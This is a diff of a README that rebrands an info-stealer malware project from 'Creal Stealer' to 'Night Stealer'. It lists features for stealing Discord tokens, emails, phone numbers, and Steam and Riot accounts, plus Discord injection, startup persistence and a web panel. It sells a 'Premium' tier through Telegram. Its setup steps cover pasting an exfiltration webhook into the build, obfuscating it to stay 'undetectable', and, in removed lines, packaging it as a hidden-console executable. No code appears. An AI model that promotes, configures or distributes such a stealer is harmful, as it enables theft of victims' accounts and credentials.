@@ -1,12 +1,14 @@
-<h1 align="center"> Creal Stealer </h1> 
-<p align= "center"> <kbd> <img  src="https://i.imgur.com/MjoICHp.png"width="420"> </kbd><br><br>
+<h1 align="center"> Night Stealer </h1> 
+<p align= "center"> <kbd> <img  src="https://github.com/GentleGanku1/Night-Stealer/blob/main/Screenshot%202025-05-12%20141746.png"width="420"> </kbd><br><br>
 
 
 
-<p align="center"><a href="https://t.me/CrealStealer" target="_blank">✨ Join Telegram for support and contact (Click me! ) ✨ </a>
+<p align="center"><a href="https://t.me/nightisnigh" target="_blank">✨ Join Telegram for Premium and contact (Click me! ) ✨ </a>
 
 
+## Added Mac Os Grabber
 
+## Download the Latest Version From [Here](
 
 
 
@@ -17,6 +19,8 @@
 - Grab Discord Token, Phone Number, E-mail and HQ Friends.
 
 - Startup
+  
+- Regrab
 
 - Discord Injection:
 
@@ -31,47 +35,28 @@
 - Grab Steam
 
 - Grab Riot Games
+  
+- Web Panel
 
     
 
                                                       ⬇️ Setup
 
                                                   
-- first open `install.bat`
+- first open `Night.exe`
 
-- open `builder.bat`
-
-<div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://i.imgur.com/0l34TBS.png"></img></div>
-
-                                                       🖼️ Pictures
- 
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal1.jpg"></img> 
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/Creal3.png"></img>
-    
-</div>
+<div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://github.com/GentleGanku1/Night-Stealer/blob/main/Screenshot%202025-05-12%20142515.png"></img></div>
  
  
                                                       ⬇️ Setup (Manual)
  
-- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
+- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Night.exe
 
-- If you use obfuscator it will be undetectable.
+- If you use obfuscator it will be undetectable.(Included in Premium)
 
 - if you have an error while installing try `pip install -r requirements.txt`
 
-- Now You need to use pyinstaller to convert python file to exe.
-
-- Open CMD and type `pip install auto_py_to_exe`
-
-- And after installed `python -m auto_py_to_exe`
-
-- Browse file Select `One file and Windows Based (hide the console)`
-
-<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png"></img>
-
-- And press covert .py .exe
+- Build will be Saved in Same directory
 
  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
